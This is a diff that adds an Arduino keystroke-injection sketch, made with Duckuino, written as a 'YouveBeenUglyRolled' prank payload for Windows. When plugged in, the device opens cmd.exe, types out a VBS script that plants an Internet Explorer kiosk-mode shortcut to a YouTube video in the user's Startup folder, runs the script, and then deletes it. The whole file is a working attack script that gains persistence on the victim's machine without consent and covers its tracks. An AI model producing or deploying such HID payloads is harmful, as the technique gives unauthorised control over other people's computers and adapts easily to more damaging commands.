@@ -1,0 +1,88 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // YouveBeenUglyRolled By petertfm
+  // payload creats a vbs script that is run to make a YouveBeenUglyRolled.lnk to IE in the users start-up folder
+  // IE is set to run in kiosk mode "-K" and links to youtube with a very annoying lady gaga with jim carrey's face video
+  // note if running in 64 bit windows, you may need to change %programfiles% with %programfiles(x86)% flash player 64 bit may not be installed!
+  typeKey(KEY_ESC);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(120);
+  Keyboard.print(F("cmd.exe"));
+
+  typeKey(KEY_RETURN);
+
+  delay(325);
+  Keyboard.print(F("copy con YouveBeenUglyRolled.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("Set WshShell = WScript.CreateObject(\"WScript.Shell\"):"));
+
+  Keyboard.print(F("StrMyStartUp = WshShell.SpecialFolders(\"Startup\"):"));
+
+  Keyboard.print(F("Set lnk = WshShell.CreateShortcut(StrMyStartUp + \"\\YouveBeenUglyRolled.lnk\"):"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("lnk.TargetPath = \"%programfiles%\\Internet Explorer\\iexplore.exe\":"));
+
+  // place any link here, this one is a very annoying lady gaga with jim carrey's face
+  // the -K option makes IE run in kiosk mode
+  Keyboard.print(F("lnk.Arguments = \"-K http://www.youtube.com/v/XYYo3T6nCw8?autoplay=1\":"));
+
+  // also try http://www.youtube.com/v/9WZGyzz5O-U?autoplay=1 for katy perry rip, or
+  // http://www.youtube.com/v/HqGsT6VM8Vg?autoplay=1 for scary car video
+  Keyboard.print(F("lnk.Save"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("YouveBeenUglyRolled.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+  Keyboard.print(F("DEL YouveBeenUglyRolled.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("EXIT"));
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
